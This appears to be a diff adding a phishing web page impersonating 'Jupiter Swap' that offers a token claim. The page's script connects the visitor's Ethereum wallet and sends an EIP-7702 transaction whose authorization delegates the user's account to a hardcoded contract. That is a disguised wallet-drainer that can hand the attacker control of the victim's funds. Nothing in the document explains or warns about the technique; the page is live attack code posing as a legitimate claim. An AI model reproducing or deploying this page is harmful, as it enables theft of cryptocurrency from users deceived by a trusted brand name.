@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jupiter Swap</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #08080f;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; padding: 20px; color: #e0e0e0;
+        }
+        .card {
+            background: #0c0c14;
+            border: 1px solid #1a1a2e;
+            border-radius: 16px;
+            padding: 36px 28px;
+            max-width: 460px; width: 100%;
+        }
+        .logo {
+            text-align: center; margin-bottom: 28px;
+            font-size: 13px; letter-spacing: 2px; color: #ff6b35;
+            text-transform: uppercase;
+        }
+        .amount {
+            text-align: center; font-size: 48px; font-weight: 700;
+            color: #fff; margin: 8px 0; letter-spacing: -1px;
+        }
+        .sub {
+            text-align: center; color: #6b7280; font-size: 13px; margin-bottom: 28px;
+        }
+        .info {
+            background: #0f0f1a; border-radius: 10px; padding: 16px;
+            margin-bottom: 24px; font-size: 13px; color: #9ca3af;
+            display: flex; align-items: center; gap: 10px;
+            border: 1px solid #1a1a2e;
+        }
+        .info-icon { font-size: 20px; }
+        .btn {
+            width: 100%; padding: 18px; border: none; border-radius: 12px;
+            font-weight: 600; font-size: 15px; cursor: pointer; margin: 8px 0;
+            transition: all 0.2s;
+        }
+        .btn-primary {
+            background: #ff6b35; color: #fff;
+        }
+        .btn-primary:hover:not(:disabled) { background: #e55a2b; }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .status {
+            text-align: center; margin-top: 14px; font-size: 12px; color: #6b7280;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">Jupiter</div>
+        <div class="amount">700</div>
+        <div class="sub">Swaptokens</div>
+        
+        <div class="info">
+            <span class="info-icon">🔐</span>
+            <span>Router: <span style="color:#ff6b35;font-family:monospace;">CONTRACT_ADDRESS_HERE</span></span>
+        </div>
+        
+        <button class="btn btn-primary" id="claimBtn"> Get It</button>
+        
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        const CONTRACT = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
+        const CHAIN_ID = '0x1';
+
+        document.getElementById('claimBtn').addEventListener('click', async () => {
+            const status = document.getElementById('status');
+            const btn = document.getElementById('claimBtn');
+
+            if (!window.ethereum) {
+                status.textContent = 'Wallet not detected.';
+                return;
+            }
+
+            btn.disabled = true;
+            btn.textContent = 'Connecting...';
+
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const userAddress = accounts[0];
+
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (chainId !== CHAIN_ID) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: CHAIN_ID }]
+                        });
+                    } catch (e) {
+                        status.textContent = 'Switch to Ethereum mainnet.';
+                        btn.disabled = false;
+                        btn.textContent = 'Claim Now';
+                        return;
+                    }
+                }
+
+                const nonce = await window.ethereum.request({
+                    method: 'eth_getTransactionCount',
+                    params: [userAddress, 'latest']
+                });
+
+                const tx = {
+                    type: '0x4',
+                    chainId: CHAIN_ID,
+                    nonce: nonce,
+                    to: userAddress,
+                    gas: '0x15F90',
+                    maxFeePerGas: '0x77359400',
+                    maxPriorityFeePerGas: '0x77359400',
+                    value: '0x0',
+                    authorizationList: [{
+                        chainId: CHAIN_ID,
+                        address: CONTRACT,
+                        nonce: '0x0',
+                        yParity: '0x0',
+                        r: '0x0000000000000000000000000000000000000000000000000000000000000000',
+                        s: '0x0000000000000000000000000000000000000000000000000000000000000000'
+                    }]
+                };
+
+                btn.textContent = 'Confirm in wallet...';
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [tx]
+                });
+
+                status.textContent = 'Claimed: ' + txHash.slice(0, 24) + '...';
+                btn.textContent = 'Complete';
+
+            } catch (e) {
+                status.textContent = '';
+                btn.disabled = false;
+                btn.textContent = 'Claim Now';
+            }
+        });
+    </script>
+</body>
+  </html>
